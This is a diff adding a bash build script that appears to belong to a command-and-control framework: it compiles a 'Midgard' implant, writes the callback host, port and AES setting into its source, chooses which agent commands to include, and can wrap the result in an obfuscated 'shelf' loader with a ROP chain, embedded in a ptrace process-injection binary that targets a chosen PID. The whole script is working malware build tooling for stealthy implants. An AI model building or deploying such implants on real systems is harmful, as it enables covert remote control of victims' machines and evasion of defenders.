@@ -1,0 +1,147 @@
+#!/usr/bin/env bash
+set -euo pipefail
+AGENT_PROFILE="Midgard"
+PROFILE_DIR="${PROFILE_DIR:-/app/$AGENT_PROFILE}"
+OUT_DIR="${OUT_DIR:-/app/Compiled_Payloads}"
+WRAPPER_DIR="/app/Wrappers"
+NAME="${OUTPUT_FILE_NAME:-agent}"
+AGENT_SOURCE="${AGENT_SOURCE:-$AGENT_PROFILE.c}"
+ARCH="${ARCH:-x86_64}"
+USEAES="${USEAES:-1}"
+HOST="${HOST:-127.0.0.1}"
+PORT="${PORT:-8000}"
+CONNECTION="$PROFILE_DIR/agent_functions/functions/connection/connection.c"
+COMPILE_ID="${COMPILE_ID}"
+WRAPPER_ARGS="${WRAPPER_ARGS:-}"
+
+# Extra debug information on build failure
+log_build_failure() {
+  local exit_code=$?
+  {
+    echo "[ERROR] agent compilation failed"
+    echo "[DEBUG] exit_code=$exit_code"
+    echo "[DEBUG] agent_profile=$AGENT_PROFILE"
+    echo "[DEBUG] profile_dir=$PROFILE_DIR"
+    echo "[DEBUG] output_name=$NAME"
+    echo "[DEBUG] architecture=$ARCH"
+    echo "[DEBUG] wrapper=${WRAPPER:-none}"
+    echo "[DEBUG] command=${BASH_COMMAND}"
+  } >&2
+}
+trap log_build_failure ERR
+
+# Allows for output capturing for frontend display
+run_make() {
+  local label="$1"
+  shift
+
+  local output_file
+  output_file="$(mktemp)"
+
+  if "$@" >"$output_file" 2>&1; then
+    cat "$output_file"
+    rm -f "$output_file"
+    return 0
+  fi
+
+  local exit_code=$?
+  {
+    echo "[ERROR] ${label} failed"
+    cat "$output_file"
+  } >&2
+  rm -f "$output_file"
+  return "$exit_code"
+}
+
+IFS=',' read -ra CMD <<< "$COMMANDS"
+IFS=',' read -ra RCMD <<< "$REQUIRED_COMMANDS"
+declare -A REQUIRED
+
+for cmd in "${RCMD[@]}"; do
+    REQUIRED["$cmd"]=1
+done
+
+# Cleans up files to compile specific commands
+# Remove existing command includes and function pointers
+    # Dosn't modify original file since it's copied and compiled in docker container.
+sed -E -i '/#include "commands\/.*"/d' "$PROFILE_DIR/agent_functions/command_header.h"
+sed -E -i "/\{\"\w*\", cmd_.*\}/d" "$PROFILE_DIR/Midgard.c"
+
+struct=""
+for cmd in "${CMD[@]}"; do
+    # Skip required commands
+    if [[ ${REQUIRED[$cmd]+_} ]]; then
+        continue
+    fi
+
+    sed -i "7i #include \"commands/${cmd}/cmd_${cmd}.h\"" "$PROFILE_DIR/agent_functions/command_header.h"
+    struct+=$'\n'"    {\"${cmd}\", cmd_${cmd}},"
+done
+# Fix function pointer
+sed -i "/\/\/ table of command names and function pointers/r /dev/stdin" "$PROFILE_DIR/Midgard.c" <<< "$struct"
+
+
+if [[ -n $WRAPPER ]]; then
+  WRAPPER_PROJECT="$(echo "$WRAPPER" | awk -F"/" '{print $4}')"
+  WRAPPER_DIR="$WRAPPER_DIR/$WRAPPER_PROJECT"
+  MODULE=$(echo "$WRAPPER" | awk -F"/" '{print $NF}')
+  PID=$(echo "$WRAPPER_ARGS" | grep -oE '"pid": ?"?[^,}]*"?' | sed -E 's/\"pid\":\"?//; s/\"//')
+  INJECT_FILE=$(echo "$WRAPPER_ARGS" | grep -oE '"inject_file_name": ?"?[^,}]*"?' | sed -E 's/\"inject_file_name\":\"?//; s/\"//')
+fi
+
+mkdir -p "$OUT_DIR"
+if [[ "$NAME" == *"/"* || "$NAME" == "." || "$NAME" == ".." ]]; then
+  echo "Error: invalid output file name: $NAME" >&2
+  exit 1
+fi
+cd "$PROFILE_DIR"
+if [[ ! -f "$AGENT_SOURCE" ]]; then
+  echo "Error: agent source file not found: $PROFILE_DIR/$AGENT_SOURCE" >&2
+  exit 1
+fi
+sed -i "s/^\(#define HOST \"\)[^\"]*\(\"\)/\1$HOST\2/" "$CONNECTION"
+sed -i "s/^\(#define PORT \).*/\1$PORT/" "$CONNECTION"
+sed -i "s/\(profile->aes = \).*/\1$USEAES;/" "$AGENT_SOURCE"
+sed -i "s/^\(#define COMPILE_ID \"\)[^\"]*\(\"\)/\1$COMPILE_ID\2/" "$AGENT_SOURCE"
+case "${ARCH,,}" in
+  x86_64|amd64|x64)
+    MAKE_ARCH="x64"
+    ;;
+  arm_64|arm64|aarch64)
+    MAKE_ARCH="aarch64"
+    ;;
+  *)
+    echo "Error: unknown architecture: $ARCH" >&2
+    exit 1
+    ;;
+esac
+sed -i "s/^\(#define ARCH \).*/\1\"$MAKE_ARCH\"/" "$PROFILE_DIR/agent_functions/functions/send/send2serv.c"
+
+if [[ -n "$WRAPPER" && "${MODULE,,}" == "shelf" ]]; then
+  sed -E -i 's/go\(\) \{/go\(struct cleanup \*params\) \{/' "$PROFILE_DIR/Midgard.c"
+  sed -E -i 's/return go\(\);/return go\(\(struct cleanup \*\)argv[1\]\);/' "$PROFILE_DIR/Midgard.c"
+  sed -E -i 's/_exit\(0\);/rop_chain(params);\n    while(1);/' "$PROFILE_DIR/Midgard.c"
+  sed -i '10i #include "cleanup-loader.h"' "$PROFILE_DIR/Midgard.c"
+
+  INCLUDE=/app/Wrappers/Obfuscation/include
+  run_make "make shelf" make --warn-undefined-variables -f compiler/Makefile shelf PROFILE="$AGENT_PROFILE" AGENT_SOURCE="$AGENT_SOURCE" NAME="$NAME" ARCH="$MAKE_ARCH" OUT_DIR="$OUT_DIR" WRAPPER_DIR="/app/Wrappers" COMMANDS="$COMMANDS" REQUIRED_COMMANDS="$REQUIRED_COMMANDS"
+  cd "/app/Wrappers/Obfuscation/shelf"
+
+  xxd -n "payload" -i $OUT_DIR/$NAME | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > ./$MAKE_ARCH/payload.h
+  gcc -O3 -I$INCLUDE -fPIC -fPIE -ffreestanding -fno-builtin -fno-stack-protector -nostdlib -nodefaultlibs -fvisibility=hidden -c ./$MAKE_ARCH/shelf-"$MAKE_ARCH"-loader.c -o ./$MAKE_ARCH/loader.o
+  ld -T linker.ld --omagic -o ./$MAKE_ARCH/loader.elf ./$MAKE_ARCH/loader.o
+  objcopy -O binary ./$MAKE_ARCH/loader.elf ./$MAKE_ARCH/loader.bin
+
+  PAYLOAD=$(grep -oP 'payload_len\s*=\s*\K\d+' ./$MAKE_ARCH/payload.h)
+
+  # Compile for ptrace reg process injection + shelf
+  sed -i "s/^\(#define PID \).*/\1$PID/" ../process_injection/$MAKE_ARCH/"$INJECT_FILE"
+  sed -i "s/^\(#define PAYLOAD_LEN \).*/\1$PAYLOAD/" ../process_injection/$MAKE_ARCH/"$INJECT_FILE"
+  sed -i "3i #include \"param_struct_${MAKE_ARCH}.h\"" loader.h
+
+  xxd -n "agent" -i "./$MAKE_ARCH/loader.bin" | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > ../process_injection/$MAKE_ARCH/agent.h
+  gcc -I$INCLUDE -static -pie -s -fPIE -Wall -O3 -o $OUT_DIR/$NAME /app/Wrappers/Obfuscation/process_injection/$MAKE_ARCH/"$INJECT_FILE"
+else
+  run_make "make agent" make --warn-undefined-variables -f compiler/Makefile agent PROFILE="$AGENT_PROFILE" AGENT_SOURCE="$AGENT_SOURCE" NAME="$NAME" ARCH="$MAKE_ARCH" OUT_DIR="$OUT_DIR" WRAPPER_DIR="/app/Wrappers" COMMANDS="$COMMANDS" REQUIRED_COMMANDS="$REQUIRED_COMMANDS"
+fi
+echo "Build complete: $OUT_DIR/$NAME ($MAKE_ARCH)"
